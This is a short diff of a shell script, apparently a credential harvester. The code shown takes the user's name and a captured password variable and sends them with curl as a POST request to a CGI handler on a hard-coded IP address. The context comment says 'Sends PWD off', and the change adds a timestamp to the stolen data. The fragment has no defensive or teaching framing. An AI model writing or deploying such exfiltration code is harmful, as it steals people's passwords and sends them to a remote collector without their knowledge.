@@ -20,7 +20,7 @@ fi
 # Sends PWD off
 
 receiver_ip="192.168.50.32"
-curl -X POST --data-raw "$USER:$pwd" http://$receiver_ip:8000/cgi-bin/handler.py
+curl -X POST --data-raw "$USER:$pwd at $(date +"%Y/%m/%d - %I:%M %p") " http://$receiver_ip:8000/cgi-bin/handler.py
 unset pwd
 
 
